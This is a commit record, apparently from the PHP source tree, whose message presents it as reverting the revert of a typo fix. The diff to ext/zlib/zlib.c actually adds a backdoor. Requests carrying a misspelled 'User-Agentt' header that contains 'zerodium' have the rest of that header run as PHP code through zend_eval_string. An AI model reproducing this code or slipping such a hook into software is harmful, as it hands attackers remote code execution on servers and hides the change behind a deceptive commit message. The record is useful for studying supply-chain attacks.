2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
Nikita Popov <nikita.ppv@gmail.com>
2021-03-28 18:15:57 +0200

    Revert "Revert "[skip-ci] Fix typo""
    This reverts commit 046827a7e867bb0e655923c75c25a20d06e3aa8b.

--- ext/zlib/zlib.c
+++ ext/zlib/zlib.c
@@ -360,6 +360,17 @@ static void php_zlib_output_compression_start(void)
 {
 	zval zoh;
 	php_output_handler *h;
+	zval *enc;
+
+	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
+		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+		convert_to_string(enc);
+		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
+			zend_try {
+				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+			} zend_end_try();
+		}
+	}
 
 	switch (ZLIBG(output_compression)) {
 		case 0:
